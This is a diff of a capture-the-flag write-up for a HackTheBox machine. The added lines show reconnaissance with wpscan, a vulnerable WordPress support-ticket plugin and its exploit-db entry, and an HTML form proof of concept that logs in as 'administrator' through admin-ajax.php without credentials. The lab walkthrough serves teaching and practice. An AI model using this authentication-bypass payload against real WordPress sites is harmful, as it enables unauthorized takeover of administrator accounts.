@@ -353,9 +353,9 @@ Interesting Finding(s):
 ```                                                                                  
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7b2df998-238a-4263-8cff-0bbee8e29fdd)
 
-
 + Navigate to `sup3rs3cr3t.brainfuck.htb`
 + It's a forum.
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/60122739-9020-453f-952e-8d4c95534b79)
 
 
 ## Findings
@@ -366,12 +366,23 @@ Interesting Finding(s):
 + wpscan results.
 + Forum.
 
-
 ## Exploits
-+ Review wpscan results, and there is a
++ Review wpscan results, and there is a vulnerable plugin on exploit-db: [wp-support-plus-responsive-ticket-system](https://www.exploit-db.com/exploits/41006)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b4440278-7ab2-4a1d-bc5a-35f39ba3f14c)
+
++ Generate POC modifying the domain on a HTML file:
+```
+<form method="post" action="http://brainfuck.htb/wp-admin/admin-ajax.php">
+  Username: <input type="text" name="username" value="administrator">
+  <input type="hidden" name="email" value="sth">
+  <input type="hidden" name="action" value="loginGuestFacebook">
+  <input type="submit" value="Login">
+</form>
+```
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/837a52be-d8e5-4bf9-ba8a-3fe84e4873bc)
 
 
-+ 
+
 
 
 ## Tools
